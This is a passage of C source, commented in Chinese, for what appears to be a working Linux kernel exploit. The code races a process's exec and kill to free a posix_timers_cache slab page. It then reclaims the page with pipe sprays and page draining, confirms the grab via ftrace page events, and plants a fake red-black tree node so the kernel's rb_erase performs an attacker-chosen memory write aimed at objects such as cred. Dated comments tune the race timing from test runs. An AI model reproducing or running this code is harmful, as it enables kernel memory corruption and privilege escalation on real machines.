            printf("[B2b] slab pfn=%llu cnt=%d arm_i=%d | node=%#llx off=%#x pfn=%llu head=%llu "
                   "(目标页=%llu, %s页)\n",
                   (unsigned long long)gp[best].pfn, gp[best].cnt, arm_i,
                   (unsigned long long)g_node_va, noff,
                   (unsigned long long)g_node_pfn, (unsigned long long)g_head_pfn,
                   (unsigned long long)g_node_pfn,
                   g_node_pfn == g_head_pfn ? "head" : "tail");
            if (noff + 24 > 0x1000) {
                printf("[-] rb_node 跨页(off=%#x), 放弃该 victim\n", noff);
                kill(victim, SIGKILL); waitpid(victim, NULL, 0);
                continue;
            }
            printf("[B2c] 候选 slab: SLUB 用 GFP_KERNEL 申请 → migratetype=UNMOVABLE(0), order=1; "
                   "discard 后整块回 free_list[1]; pipe(GFP_HIGHUSER) 同链表, 能抢\n");
        }

        /* 几何自检（开窗前）: 只在"干净几何"上开枪。
         * 成功枪(w93/wshot) 全部满足 recs≈timers、满30≈19~20、arm_i=58;
         * 脏几何(recs 多 3~10 条 / 满30<=17 / arm_i>=120) 实测必然桥失败或延迟崩溃,
         * 因此在这里直接弃用该 victim（不进入窗口, kill 是安全的），换下一次 attempt。
         * 2026-11-04: recs 偶发比 okc 多 1 条(631→632), 先做归属诊断: 多出的记录
         * 只要全部落在"非满组"(cnt<30)、且没有任何一组 cnt>30(说明记录与对象别名),
         * 目标组仍是独占 30/30, 就不影响 order-1 slab 的 discard, 允许放行。 */
        {
            int over = tot - okc, alias = 0, nf = 0;
            for (int i = 0; i < ng; i++) {
                if (gp[i].cnt > NPF) alias++;
                else if (gp[i].cnt < NPF) nf++;
            }
            if (over != 0 || alias) {
                printf("[B2e] 记录归属: recs=%d okc=%d 多=%d 非满组=%d |", tot, okc, over, nf);
                for (int i = 0; i < ng && i < 12; i++)
                    if (gp[i].cnt != NPF)
                        printf(" %d:%llu%s", gp[i].cnt, (unsigned long long)gp[i].pfn,
                               gp[i].cnt > NPF ? "!" : "");
                printf("\n");
            }
            /* 2026-11-04 数据回归: 成功枪几何并不"必须 631":
             *   w93k  recs=634 满30=17 arm_i=120   → GATE=PASS
             *   wshot recs=632 满30=19             → GATE=PASS
             * 旧闸(recs==631 且 满30>=19 且 arm_i<=60)会把上面两个成功样本误杀,
             * 因此放宽为"只挡明显脏几何", 其余一律告警放行。 */
            /* 2026-11-05: 实测 alias=1 是泄漏扫描把同一对象记了两次（一个 slab 出现 31 条
             * pid=tid 记录，而实际只有 30 个对象），不是多出来的活对象；目标 slab 仍从
             * cnt==30 的干净组里挑，因此允许 alias<=1，仅当 over<=1 时放行。 */
            /* 2026-11-06 (a23 实测): boot 期系统自有 timer 会给泄漏扫描带进 2 条额外记录
             * (recs=633 okc=631 多=2 alias=2, 满30=18/22)，旧闸(over<=1/c30>=19/alias<=1)
             * 必然误杀 → 每个 boot 的第一次 attempt 全部被弃用，之后 slabdata 抬高锁死。
             * 成功样本 w93k 本身 recs=634 满30=17 arm_i=120 也能过，说明这些指标不是安全条件；
             * 真正的安全条件已后移为「抢到页后 800ms 无新增 free」(B15w)，故此处放宽为仅挡明显脏。 */
            if (over < 0 || over > 2 || c30 < 18 || arm_i > 60 || alias > 2) {
                printf("[-] 几何脏 (recs=%d/%d 满30=%d/%d arm_i=%d alias=%d) → 弃用该 victim, 重试\n",
                       tot, okc, c30, ng, arm_i, alias);
                kill(victim, SIGKILL); waitpid(victim, NULL, 0);
                continue;
            }
            if (over > 0)
                printf("[B2f] 放行: recs=%d(okc=%d) 多出的 %d 条仅落在非满组; 目标 pfn=%llu cnt=%d\n",
                       tot, okc, over, (unsigned long long)gp[best].pfn, gp[best].cnt);
        }

        /* 让 victim 武装选定的那个 timer（树里只有 1 个节点） */
ps_arm:
        {
            int ai = arm_i, r = -1;
            if (xwrite(g_rfd, &ai, 4) || xread(g_wfd, &r, 4) || r != arm_i) {
                printf("[-] arm 握手失败 r=%d\n", r);
                kill(victim, SIGKILL); waitpid(victim, NULL, 0);
                continue;
            }
        }

        /* kmem 关 / mm 开 + pfn 过滤 / 清 trace */
        if (!g_puresh) {
        relay_q("echo 0 > %s/events/kmem/kmem_cache_alloc/enable", TRACE_DIR);
        /* 用**精确** pfn 过滤 (relay 不支持空格/||, 但支持 pfn==<num>)。
         * 全通 pfn!=0 会让 ring 塞满全系统 page 事件, trace_scan 单次要 8s,
         * B11 的 800ms 采样循环实际上只跑了 1 次 → discard 时序全失真。
         * 精确过滤后 ring 里只有目标页的 2 类事件, 扫描降到 ms 级。 */
        relay_q("echo pfn==%llu > %s/events/kmem/mm_page_free/filter",
                (unsigned long long)g_head_pfn, TRACE_DIR);
        relay_q("echo pfn==%llu > %s/events/kmem/mm_page_alloc/filter",
                (unsigned long long)g_node_pfn, TRACE_DIR);
        relay_q("echo 1 > %s/events/kmem/mm_page_free/enable", TRACE_DIR);
        relay_q("echo 1 > %s/events/kmem/mm_page_alloc/enable", TRACE_DIR);
        relay_q("echo > %s/trace", TRACE_DIR);
        }
        {
            char s0[160] = { 0 };
            char s1[160] = { 0 };
            slab_objs("posix_timers_cache", s0, sizeof s0);
            printf("[B7] slabinfo(pre-go) %s\n", s0);
            /* 2026-11-04 数据回归: 所有成功样本 slabdata=32; slabdata>=36 的样本
             * 全部在 round1~round2 喷涂阶段 panic（与 recs/free 次数无关）。
             * 因此喷涂前加硬闸: slabdata > 33 直接弃用该 victim（安全 discard 路径）。 */
            {
                int sd1 = 0, sd2 = 0;
                char *psd = strstr(s0, "slabdata");
                if (psd && sscanf(psd + 8, "%d %d", &sd1, &sd2) >= 1) {
                    int sdn = sd1 > sd2 ? sd1 : sd2;
                    /* 默认仍为 33（11-04 数据: slabdata>=36 的样本在喷涂阶段 panic）；
                     * 需要吃 36~40 的样本时用 SLABGATE=40 显式放开, 不写死。 */
                    const char *gse = getenv("SLABGATE");
                    int gate_sd = gse ? atoi(gse) : 33;
                    if (sdn > gate_sd) {
                        printf("[-] slabdata 闸: slabdata=%d > %d → 弃用该 victim, 重试\n", sdn, gate_sd);
                        if (victim > 0) { kill(victim, SIGKILL); waitpid(victim, NULL, 0); }
                        victim = -1;
                        continue;
                    }
                }
            }
            /* 弱版 freelist 稳定性确认: 20ms 内 slabinfo 若漂移, 说明有其它内核线程
             * 正在这个 cache 上分配/释放, 此时开枪必然被外部抢占 → 直接弃用该 victim */
            usleep(20000);
            slab_objs("posix_timers_cache", s1, sizeof s1);
            if (strcmp(s0, s1) != 0) {
                printf("[-] slabinfo 20ms 内漂移:\n     %s\n     %s\n     → 弃用该 victim, 换下一次 attempt\n",
                       s0, s1);
                if (victim > 0) { kill(victim, SIGKILL); waitpid(victim, NULL, 0); }
                victim = -1;
                continue;
            }
        }

        /* ===== [B7c/B7d] 方案B: 开枪前压页 =====
         * pipe 页来自 alloc_page(GFP_HIGHUSER|__GFP_ACCOUNT) → UNMOVABLE order-0,
         * 与 victim 的 8KB slab 块在同一条 buddy 链表上。
         * 顺序很关键: 先建 g_npipe 个 1MB pipe(此时还在 pipe-user-pages-soft
         * (=16384 页)/uid 以内, 容量得到 256 页, 留给喷涂); 再建"1 页小 pipe"
         * 并逐页填充 —— 超过软限后新建 pipe 只有 1 页容量(kernel fs/pipe.c),
         * 但这些页同样是 UNMOVABLE order-0, 且被一直占住。
         * 压掉 N 页后, victim 块被 discard 进 free_area[1] 时, 喷涂的 order-0
         * 申请更可能被迫从 order-1 拆块 → 目标页进入 pipe。 */
        if (g_drain_pages > 0) {
            if (!g_pf) {
                int want = g_npipe;
                if (want > 60) want = 60;
                int *pp = calloc((size_t)want * 2, sizeof(int));
                int nn = 0;
                for (int i = 0; i < want; i++) {
                    int p[2];
                    if (pipe(p)) break;
                    int gg = fcntl(p[1], F_SETPIPE_SZ, SPRAY_SZ);
                    if (i == 0) {
                        int cap = fcntl(p[1], F_GETPIPE_SZ);
                        printf("[B7c] 预建喷涂 pipe#0 F_SETPIPE_SZ ret=%d cap=%d%s\n", gg, cap,
                               cap < SPRAY_SZ ? "  ← 配额不足, 喷涂能力骤降!" : "");
                    }
                    int fl = fcntl(p[1], F_GETFL);
                    fcntl(p[1], F_SETFL, fl | O_NONBLOCK);
                    fl = fcntl(p[0], F_GETFL);
                    fcntl(p[0], F_SETFL, fl | O_NONBLOCK);
                    pp[nn * 2] = p[0]; pp[nn * 2 + 1] = p[1];
                    nn++;
                }
                g_pf = pp; g_npf = nn;
                printf("[B7c] 预建喷涂 pipes=%d 容量=%d页/pipe\n", nn,
                       nn > 0 ? fcntl(pp[1], F_GETPIPE_SZ) / 4096 : 0);
            }
            static unsigned char zbuf[4096];
            static int dfd[2 * 16000];
            int dn = 0;
            long long dp = 0;
            for (; dn < 15600 && dp < g_drain_pages; dn++) {
                int p[2];
                if (pipe(p)) break;
                int fl = fcntl(p[1], F_GETFL);
                fcntl(p[1], F_SETFL, fl | O_NONBLOCK);
                if (write(p[1], zbuf, 4096) != 4096) { close(p[0]); close(p[1]); break; }
                dfd[dn * 2] = p[0]; dfd[dn * 2 + 1] = p[1];
                dp++;
            }
            printf("[B7d] 压页: 小pipe=%d 占住 %lld 页 (%.1fMB) | 喷涂pipe=%d\n",
                   dn, dp, (double)dp * 4.0 / 1024.0, g_npf);
        }

        /* readers + killer */
        if (g_ksweep) {
            g_kill_cur = g_kill_us0 + (at - 1) * g_kill_step;
            printf("[B7s] 步进扫描: attempt %d/%d 落刀延时 -j %dus\n", at, g_attempts, g_kill_cur);
        }
        if (!(g_puresh && getenv("PSNOKILL"))) {
            for (int i = 0; i < g_nreader; i++) {
                pid_t p = fork();
                if (p == 0) _exit(reader_main());
            }
            pid_t killer = fork();
            if (killer == 0) _exit(killer_main());
        }
        if (g_puresh && getenv("PSHOLD")) {
            int ai2 = -1, got = -1;
            int fl = fcntl(g_wfd, F_GETFL, 0);
            if (fl >= 0) fcntl(g_wfd, F_SETFL, fl | O_NONBLOCK);
            long long t0 = now_us();
            while (now_us() - t0 < 2000000LL) {
                if (read(g_wfd, &ai2, 4) == 4) { got = 0; break; }
                usleep(10000);
            }
            if (fl >= 0) fcntl(g_wfd, F_SETFL, fl);
            if (got == 0) {
                printf("[PSH] victim armed ai=%d -> 测量空洞占用(不 kill)\n", ai2);
                fflush(stdout);
                ps_gate_run();
            } else {
                printf("[PSH] 未收到 ai (2s 超时), 跳过测量\n");
            }
            fflush(stdout);
        }
        usleep(g_pre_us);
        {
            char cc = 2;
            if (g_ftrace) ftrace_arm(victim);
            xwrite(g_rfd, &cc, 1);
        }

        char comm[64] = { 0 };
        char stt = '?';
        long long t0 = now_us();
        while (now_us() - t0 < 6000000LL) {
            stt = proc_state(victim, comm, sizeof comm);
            if (stt == 'Z' || stt == 'X' || stt == '?') break;
            usleep(500);
        }
        long long tz = now_us() - t0;
        int hit = g_force_hit ? 1 :
                  (!strcmp(comm, "timer-exec") ||
                   (g_kmode_state && strcmp(comm, "exe") != 0 && strcmp(comm, "?") != 0));
        printf("[B8] zombie=%c comm='%s' in %lldus | ku=%d | reads=%d opens=%d err=%d | go+%lldus det+%lldus kill+%lldus\n",
               stt, comm, tz, g_ksweep ? g_kill_cur : g_kill_us, SH->readers, SH->opens, SH->open_err,
               SH->t_det ? SH->t_det - SH->t_go : -1,
               SH->t_kill ? SH->t_kill - SH->t_det : -1,
               SH->t_kill && SH->t_go ? SH->t_kill - SH->t_go : -1);
        if (!hit) {
            printf("   → MISS (exec 正常完成), 安全 reap 后重试\n");
            waitpid(victim, NULL, 0);
            continue;
        }
        printf("== WINDOW HIT (attempt %d)\n", at);

        {
            char s1[160] = { 0 };
            slab_objs("posix_timers_cache", s1, sizeof s1);
            printf("[B8b] slabinfo(at-hit) %s\n", s1);
        }

        /* 证据链: 现在就把 sprayer fork 好并让它阻塞(避免 fork 自身在 discard 之后
         * 抢走 order-1 slab → 假阴性), discard 确认后再放它去建 timer。 */
        if (g_evchain) {
            int gp[2], dp[2];
            if (pipe(gp) || pipe(dp)) { printf("[-] sprayer pipe\n"); return 3; }
            pid_t s2 = fork();
            if (s2 == 0) {
                close(gp[1]); close(dp[0]);
                pin_cpu(g_pcpu);
                static timer_t tv[4096];
                char go = 0;
                if (read(gp[0], &go, 1) != 1) _exit(1);
                struct sigevent ev;
                memset(&ev, 0, sizeof ev);
                ev.sigev_notify = SIGEV_NONE;
                clockid_t ck = g_thread_clock ? CLOCK_THREAD_CPUTIME_ID
                                             : CLOCK_PROCESS_CPUTIME_ID;
                int made = 0, lim = g_spray_n > 4096 ? 4096 : g_spray_n;
                for (int i = 0; i < lim; i++)
                    if (timer_create(ck, &ev, &tv[i]) == 0) made++;
                int r2[2] = { (int)syscall(SYS_gettid), made };
                if (write(dp[1], r2, sizeof r2) != (ssize_t)sizeof r2) _exit(1);
                for (;;) pause();                 /* 对象必须一直存活 */
            }
            close(gp[0]); close(dp[1]);
            g_sp_pid = s2; g_sp_go = gp[1]; g_sp_done = dp[0];
            printf("[B8c] 证据链 sprayer 就绪 pid=%d (阻塞等 discard)\n", s2);
        }

        /* ---- 连续喷涂 (-c): kill 之后立刻开始, 不等 discard ----
         * 关键: 用无空格的精确 pfn filter, trace 只剩目标页事件 → 扫描从 ~8s 降到 ms;
         * 边喷边扫, 页一旦归还, 我们的下一次 order-0 分配立刻拿走, 不给系统负载留空窗。 */
        struct tinfo ti;
        memset(&ti, 0, sizeof ti);
        if (g_cspray) {
            static unsigned char ctmpl[4096];
            build_tmpl(ctmpl);
            spray_reset();
            relay_q("echo pfn==%llu > %s/events/kmem/mm_page_free/filter",
                    (unsigned long long)g_head_pfn, TRACE_DIR);
            relay_q("echo pfn==%llu > %s/events/kmem/mm_page_alloc/filter",
                    (unsigned long long)g_node_pfn, TRACE_DIR);
            relay_q("echo > %s/trace", TRACE_DIR);
            long long t0 = now_us(), np = 0;
            int rds = 0;
            while (now_us() - t0 < (long long)g_cspray_ms * 1000) {
                int add = spray_chunk(ctmpl, g_chunk_mb);
                if (add > 0) np += add;
                rds++;
                trace_scan(g_head_pfn, g_node_pfn, &ti);
                if (ti.nalloc_mine_unmov) break;
                if (add <= 0) break;
                /* 步进扫描: 页一直没回 buddy 说明这一格没有 discard 可等, 不必耗满预算 */
                if (g_ksweep && !ti.nfree && now_us() - t0 > 900000) break;
            }
            printf("[B13c] 连续喷涂 %d 轮 %lld pages (%.1fMB) in %lldms | "
                   "free(n=%d) alloc(node pfn=%llu n=%d mine=%d mine_unmov=%d mt=%d)\n",
                   rds, np, (double)np * 4096.0 / 1048576.0, (now_us() - t0) / 1000,
                   ti.nfree, (unsigned long long)g_node_pfn, ti.nalloc, ti.nalloc_mine,
                   ti.nalloc_mine_unmov, ti.mt_mine);
            printf("[B11] discard(nfree=%d) pfn=%llu order=1 (连续喷涂模式)\n",
                   ti.nfree, (unsigned long long)g_head_pfn);
            sm("[SM] B13c 连续喷涂 pages=%lld mine=%d mine_unmov=%d any=%d",
               np, ti.nalloc_mine, ti.nalloc_mine_unmov, ti.nalloc);
            g_cmine = ti.nalloc_mine_unmov; g_cany = ti.nalloc;
            if (!ti.nalloc_mine_unmov) {
                if (!ti.nfree) {
                    /* 目标页压根没回 buddy → 节点内存仍归 slab, 树节点指向的仍是有效内存,
                     * reap 不会踩野指针。步进扫描必须能继续走下一格, 所以这里安全 reap。 */
                    printf("== SWEEP: 目标页未释放(nfree=0) → 安全 reap, 继续扫描\n");
                    waitpid(victim, NULL, 0);
                    continue;
                }
                printf("== VERDICT: PARKED (连续喷涂仍未拿到目标页; 不 reap, 保持挂起)\n");
                self_protect();
                for (;;) pause();
            }
            g_cgate = 1;
        } else {
        /* ---- 不再“先等 discard 再喷”。5 次成功的日志中 free(n=1) 与
         * alloc(mine=1) 总是出现在同一轮喷涂里 —— 说明喷涂必须在 discard
         * 之前就已经在飞行。等 800ms 会让目标 8KB 块早被别人以 order=1 整体取走,
         * 之后 order-0 的喷涂永远碰不到它 (mine 恒为 0)。这里直接进入喷涂循环,
         * discard 时的 mm_page_free 由循环内的 trace_scan 观察到。 */
        }
        break;
    }
    if (at > g_attempts) {
        printf("== VERDICT: %d 次尝试全部未拿到 (hit+discard)\n", g_attempts);
        for (;;) pause();
    }

    /* ================= 证据链模式 (-S) =================
     * 前提: 目标 8KB 已确认被 discard 回 buddy (trace: mm_page_free order=1 pfn=H)。
     * 验证: 新起一个进程再建 30 个 k_itimer → posix_timers_cache 必然分配新 slab
     *       (order=1) → 若它拿到 H, 则"释放→归还→新 slab 复用同一物理页"成立,
     *       同时用泄漏到的对象 VA 反推块基页 pfn 做二次确认。
     * 安全: 只建 timer(不建树), 不做 exec, 不 reap, 结束后永久挂起。 */
    if (g_evchain) {
        printf("==== 证据链 S1: 目标块已回 buddy ====\n");
        printf("[S1] head_pfn=%llu (=H), 节点块基址页 pfn=%llu, node=%#llx off=%#x\n",
               (unsigned long long)g_head_pfn, (unsigned long long)(g_head_pfn),
               (unsigned long long)g_node_va, (unsigned)(g_node_va & 0xfff));
        {
            char s0[160] = { 0 };
            slab_objs("posix_timers_cache", s0, sizeof s0);
            printf("[S1b] slabinfo(before spray) %s\n", s0);
        }

        /* 证据链只关心 mm 事件:
         *  - 关 kmem(它会把 64MB ring 灌满, 把 alloc 事件挤掉)
         *  - 不设 filter: relay 不支持带空格/`>` 的表达式, 而 "1"/"" 都不是合法 filter;
         *    改为"清 trace + 紧接 spray + 立刻读取"把噪声窗口压到最小。 */
        relay_q("echo 0 > %s/events/kmem/kmem_cache_alloc/enable", TRACE_DIR);
        relay_q("echo 1 > %s/events/kmem/mm_page_alloc/enable", TRACE_DIR);
        relay_q("echo 1 > %s/events/kmem/mm_page_free/enable", TRACE_DIR);
        relay_q("echo > %s/trace", TRACE_DIR);

        int r[2] = { 0, 0 };
        if (g_sp_go < 0) { printf("[-] sprayer 未就绪\n"); for (;;) pause(); }
        {
            char go = 1;
            if (write(g_sp_go, &go, 1) != 1) printf("[!] 唤醒 sprayer 失败\n");
        }
        if (xread(g_sp_done, r, sizeof r)) { printf("[-] sprayer 握手失败\n"); }
        g_sp_tid = r[0];
        printf("[S2] sprayer=%d tid=%d 新建 timer=%d → 预期顶出 %d 个新 slab\n",
               g_sp_pid, r[0], r[1], r[1] / NPF);
        usleep(50000);           /* 只留 50ms 噪声窗口, 然后立刻取样 */

        {
            char s1[160] = { 0 };
            slab_objs("posix_timers_cache", s1, sizeof s1);
            printf("[S4] slabinfo(after spray) %s\n", s1);
        }
        printf("[S5] trace 文本级核对 (kmem 已关, 不设 filter, 50ms 窗口):\n");
        int aa = 0, ah = 0, fh = 0, mine = 0;
        {
            static char hits[16 * 160];
            memset(hits, 0, sizeof hits);
            int nh = trace_pfn_hits(g_head_pfn, &aa, &ah, &fh, &mine, g_sp_pid,
                                    hits, 16);
            printf("       本轮 mm_page_alloc 总行数=%d ; pfn∈{H,H^1}: alloc=%d free=%d, "
                   "其中属于 sprayer(pid=%d) 的=%d\n", aa, ah, fh, g_sp_pid, mine);
            for (int k = 0; k < nh && k < 16; k++)
                printf("       hit| %s\n", hits + (size_t)k * 160);
            printf("       ⇒ H=%llu %s\n", (unsigned long long)g_head_pfn,
                   ah ? (mine ? "被【我们的 sprayer】以 order=1 拿回 ★"
                              : "被别的任务以 order=1 拿走")
                      : "仍在 buddy 空闲链表中(无人占用)");
            if (!ah && !mine) {
                printf("       (注: 说明还要更多新 slab 才能把空闲链表走到 H, 或 H 下沉较深)\n");
            }
        }
        printf("== 证据链结论: %s\n", mine
               ? "PASS —— 同一 8KB 被我们的新 slab 拿回 (order 匹配成立)"
               : (ah ? "MISS(被他人抢)" : "MISS(H 仍空闲, 未走到链表该位置)"));
        printf("== PARKED(证据链模式, 不 reap, 永久挂起)\n");
        self_protect();
        for (;;) pause();
    }

    /* ---- P11: 喷涂（多轮; 每轮前清 trace, 这样"目标页被分配"就必然是我们本轮写的） ---- */
    if (g_puresh) {
        /* 纯 shell 验证：模板已在 ps_make_holes 预置进空洞页，这里喷涂统计
         * "还有哪些空洞页对是空闲的"，并打印 posix_timers_cache slab 计数。 */
        {
            int nf = ps_gate_run();
            if (getenv("PSPARK")) {
                printf("[PS] PSPARK 验证结束: 空闲=%d 被占用=%d/%d（不 reap, 不动 victim）\n",
                       nf, g_ps_nhole - nf, g_ps_nhole);
                ps_cleanup_exit(0);
            }
            if (nf != 0) {
                printf("== VERDICT: PARKED (PURESH 空洞未全部被占用; 不 reap)\n");
                ps_cleanup_exit(0);
            }
        }
        goto ps_reap;
    }
    /* [单变量诊断] NOSPRAY：kill 之后完全不建 pipe、不喷涂，只挂起观察。
     * 用于区分「破坏由内核自身清理路径触发」还是「由我方抢回已归还的 order-1 块触发」。 */
    if (getenv("NOSPRAY")) {
        printf("[N] NOSPRAY=1：跳过全部喷涂（不建 pipe、不分配页），原地挂起观察\n");
        fflush(stdout);
        for (;;) sleep(3600);
    }
    pin_cpu(g_pcpu);
    static unsigned char tmpl[4096];
    memset(tmpl, 0, sizeof tmpl);
    if (g_insert) {
        /* 方案 B stage1: 真正用于 pipe 喷涂的模板也必须走插入布局 */
        g_off = (int)(g_node_va & 0xfff);
        build_ins_tmpl(tmpl, g_off);
    } else {
        int off = (int)(g_node_va & 0xfff);
        g_off = off;
        if (off + 0x18 > 4096) printf("[!] node 跨页 off=%#x\n", off);
        /* 与 build_tmpl 保持一致: -P 用文档 Case1 布局 */
        int isp2 = (g_nop && !g_dverify);
        uint64_t pcv2 = isp2 ? ((g_target - 8) | 1ULL) : 0;
        uint64_t rv2  = isp2 ? (g_ops_scr[g_wround] ? self_scratch(off) : g_ops_v[g_wround]) : 0;
        uint64_t lv2  = isp2 ? 0 : g_target;
        if (isp2)
            printf("[B12p] Case1 模板: VICTIM=%#llx PAYLOAD=%#llx pc=%#llx\n",
                   (unsigned long long)g_target, (unsigned long long)rv2,
                   (unsigned long long)pcv2);
        *(uint64_t *)(tmpl + off) = pcv2;              /* __rb_parent_color */
        *(uint64_t *)(tmpl + off + 8) = rv2;           /* rb_right (Case1 child 非空) */
        *(uint64_t *)(tmpl + off + 0x10) = lv2;        /* rb_left = 0 → Case1 */
        /* -D 自证模式: 把写目标改成"我们自己这页内的一个标记位"。
         * rb_erase Case2 会执行 *(u64*)left = 0, 于是该标记位从 MARK 变 0;
         * 之后把 sp.bin 读回来就能直接看到"内核到底有没有执行这次写"，
         * 完全不依赖 cred/comm 之类目标对象是否正确。 */
        if (g_dverify) {
            int voff = (off + 0x800) & 0xfff;
            if (voff < off + 0x18 && voff + 0x10 > off) voff = (off + 0x400) & 0xfff;
            if (voff < off + 0x18 && voff + 0x10 > off) voff = (off + 0x200) & 0xfff;
            uint64_t mark = 0x4d41524b4d41524bULL;      /* "MARKMARK" */
            *(uint64_t *)(tmpl + voff) = mark;
            *(uint64_t *)(tmpl + voff + 8) = mark;
            g_target = (g_node_va & ~0xfffULL) | (uint64_t)voff;
            *(uint64_t *)(tmpl + off + 0x10) = g_target;
            g_dvoff = voff;
            printf("[B12D] 自证模式: 目标=本页 +%#x (MARK 处), 期望内核把该 8B 写成 0\n", voff);
        }
        printf("[B12] 模板 off=%#x  pc=%#llx right=%#llx left=%#llx (head@+0x20 保持 0, "
               "避免 del 时 deref 假 head)\n",
               off, (unsigned long long)pcv2, (unsigned long long)rv2,
               (unsigned long long)lv2);
    }
    int *pf = NULL;
    int nfd = 0;
    if (g_fspray_mb > 0) {
        printf("[B12f] 文件 page cache 喷涂模式: 每轮 %d MB (内容=同一 4KB 模板)\n",
               g_fspray_mb);
    } else if (g_naio <= 0) {
        /* pipe-user-pages-soft 默认 16384 个 buffer / uid, 且 sysctl 改不动(SELinux)。
         * 一个 16MB 的 pipe 组 = 16*256 = 4096 buffer, 留 3/4 余量给历史 PARKED 实例。 */
        int want = g_npipe;
        /* pipe-user-pages-soft 默认 16384 页/uid (=64MB)。64 个 1MB pipe 正好用满;
         * 注意 pipe 页是 GFP_HIGHUSER|__GFP_ACCOUNT (migratetype=UNMOVABLE, order=0),
         * 与 posix_timers_cache 的 8KB slab 在**同一个** buddy 链表里 ——
         * 这正是 t2 失败原因的反面: -F 的 page cache 是 MOVABLE, 永远抢不到 slab 块。 */
        if (want > 60) want = 60;   /* 留 1/16 余量给历史实例, 顶满会被内核压成 16 页/pipe */
        if (g_pf && g_npf > 0) {
            /* 方案B: 喷涂 pipe 已在开枪前预建(容量 256 页), 这里直接复用 */
            pf = g_pf; nfd = g_npf;
            printf("[B12c] 复用预建 pipes=%d (每 pipe %d 页)\n", nfd, fcntl(pf[1], F_GETPIPE_SZ) / 4096);
            printf("[B12e] pipe 页保持占用直到 reap 完成之后(绝不提前 close)\n");
        } else {
        pf = calloc((size_t)want * 2, sizeof(int));
        for (int i = 0; i < want; i++) {
            int p[2];
            if (pipe(p)) break;
            int g = fcntl(p[1], F_SETPIPE_SZ, SPRAY_SZ);
            if (i == 0) {
                int cap = fcntl(p[1], F_GETPIPE_SZ);
                printf("[B12c] pipe#0 F_SETPIPE_SZ(1MB) ret=%d, F_GETPIPE_SZ=%d%s\n", g, cap,
                       cap < SPRAY_SZ ? "  ← 配额已被历史实例吃满, 喷涂能力会骤降!" : "");
            }
            int fl = fcntl(p[1], F_GETFL);
            fcntl(p[1], F_SETFL, fl | O_NONBLOCK);
            /* 读端也必须非阻塞: -D 自证要从读端回读, 空 pipe 上阻塞 read 会永久挂死 */
            fl = fcntl(p[0], F_GETFL);
            fcntl(p[0], F_SETFL, fl | O_NONBLOCK);
            pf[nfd * 2] = p[0]; pf[nfd * 2 + 1] = p[1];
            nfd++;
        }
        printf("[B12c] pipes=%d (每 pipe 最多 %d 页)\n", nfd,
               nfd > 0 ? fcntl(pf[1], F_GETPIPE_SZ) / 4096 : 0);
        /* 给 -D 自证用: 之后从这些 pipe 的**读端**把内容读回来校验 MARK。
         * 注意只能在 reap 之后读(读会把页归还 buddy), 之前读会毁掉别名页内容。 */
        g_pf = pf; g_npf = nfd;
        printf("[B12e] pipe 页保持占用直到 reap 完成之后(绝不提前 close): "
               "提前归还 → 别名页消失, 假节点内容失效; 延后归还 → 无副作用\n");
        }
        if (nfd <= 0) { printf("== VERDICT: PARKED (无法建 pipe)\n"); self_protect(); for (;;) pause(); }
    } else {
        printf("[B12b] AIO 喷涂模式: 每轮 %d 个 ctx × %zu 页\n", g_naio, g_ring_pages);
    }

    int gate = 0;
    int arund = 0;                 /* 抢到目标页的那一轮（0=未抢到；99=连续喷涂模式不区分轮次） */
    long long freecnt = 0;         /* 累计 mm_page_free(order=1, head pfn) 次数 = slab discard 计数 */
    struct tinfo tg = { 0 };
    long long pages = 0;
    int ppp = 1;                       /* 每个 pipe 的页数(F_SETPIPE_SZ 之后) */
    if (nfd > 0) { int c = fcntl(pf[1], F_GETPIPE_SZ); if (c > 0) ppp = c / 4096; }
    /* [P13b] POSTFREE：先等内核把目标 slab 页 discard 回 buddy（mm_page_free 出现），
     * 再开始喷涂抢页。
     * 依据（v93b 实证）：free#1 由 ksoftirqd 在 exec 清理期完成，free#2 由本进程
     * waitpid/release_task 完成，两者相距约 375ms；而 rb_erase 发生在 free#2 之前
     * （release_task 内的 timer 清理），所以模板必须落在 [free#1, reap] 之间才可能
     * 被 rb_erase 当成假节点读到。原先 kill 后立刻喷涂，2048 页在 free#1 之前就分配
     * 完了，导致 mine=0 → 坏块留在 buddy → panic。
     * 不能在 reap 之后再喷：那时 rb_erase 已执行完，模板再准也没用。 */
    if (getenv("POSTFREE")) {
        long long pf0 = now_us();
        int seen = 0;
        trace_scan(g_head_pfn, g_node_pfn, &tg);       /* 先看一眼是否已 free */
        seen = tg.nfree;
        for (int k = 0; k < 400 && !seen; k++) {
            relay_q("echo pfn!=0 > %s/events/kmem/mm_page_free/filter", TRACE_DIR);
            relay_q("echo > %s/trace", TRACE_DIR);
            usleep(5000);
            trace_scan(g_head_pfn, g_node_pfn, &tg);
            seen = tg.nfree;
        }
        freecnt += seen;
        printf("[PF] POSTFREE=1: 首帧 discard free=%d, 等待 %lldus "
               "(node pfn=%llu head=%llu)\n", seen, now_us() - pf0,
               (unsigned long long)g_node_pfn, (unsigned long long)g_head_pfn);
        fflush(stdout);
        sm("[SM] PF 首帧 free=%d 等待=%lldus", seen, now_us() - pf0);
    }
    /* [P13c] GRAB=<静默ms>：等「最后一次 free」后一次性突发抢页。
     * 依据（w93 成功样本）：三次 free 全在 round1 完成，round4 才抢到；说明正确顺序是
     * 「free 全部结束 → 抢页 → reap（rb_erase 才执行）」。
     * 步骤：① 等目标 pfn 首次 free；② 连续静默 GRAB ms 无新 free（确认最后一次已过）；
     * ③ 一次性把全部 pipe 写满（LIFO：链头的就是刚 free 的 order-1 块，抽干 order-0 后
     *    下一次劈块即命中）；④ 扫描 trace 确认 mine_unmov=1。
     * 注意：free 次数本身由内核清理路径决定，不可设成固定值；本路径只保证「抓在最后
     * 一次 free 之后」，避免二次 free 落到我们持有的页上。 */
    if (getenv("GRAB")) {
        int qms = atoi(getenv("GRAB"));
        if (qms <= 0) qms = 200;
        long long gf0 = now_us();
        int seen = 0;
        for (int k = 0; k < 800 && !seen; k++) {
            relay_q("echo pfn!=0 > %s/events/kmem/mm_page_free/filter", TRACE_DIR);
            relay_q("echo > %s/trace", TRACE_DIR);
            usleep(5000);
            trace_scan(g_head_pfn, g_node_pfn, &tg);
            seen = tg.nfree;
        }
        freecnt += seen;
        int stable = 0;
        while (stable < qms) {
            relay_q("echo pfn!=0 > %s/events/kmem/mm_page_free/filter", TRACE_DIR);
            relay_q("echo > %s/trace", TRACE_DIR);
            usleep(5000);
            trace_scan(g_head_pfn, g_node_pfn, &tg);
            if (tg.nfree) { freecnt += tg.nfree; stable = 0; }
            else stable += 5;
        }
